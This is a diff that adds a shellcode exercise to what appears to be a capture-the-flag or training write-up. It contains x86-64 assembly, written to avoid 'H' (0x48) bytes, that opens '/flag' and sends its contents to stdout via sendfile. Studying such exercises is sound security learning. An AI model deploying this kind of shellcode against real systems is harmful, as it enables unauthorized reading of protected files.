@@ -37,3 +37,30 @@ xor     rax, rax
 mov     al, 0x28	            # rax = 40
 syscall			                # sendfile
 ```
+## ex 4
++ the shellcode must have NO 'H' bytes
+```
+mov     r10, 0x00000067616c662f
+push    r10
+
+push    2
+pop     rax             # rax = 2
+push    rsp
+pop     rdi             # rdi = rsp
+push    0
+pop     rsi             # rsi = 0
+push    0
+pop     rdx             # rdx = 0
+syscall                 # open
+
+push    1
+pop     rdi             # rdi = 1
+push    rax
+pop     rsi             # rsi = rax (return value of open)
+push    0
+pop     rdx             # rdx = 0
+mov     r10, 1000       # r10 = 1000
+push    40
+pop     rax             # rax = 40
+syscall                 # sendfile
+```
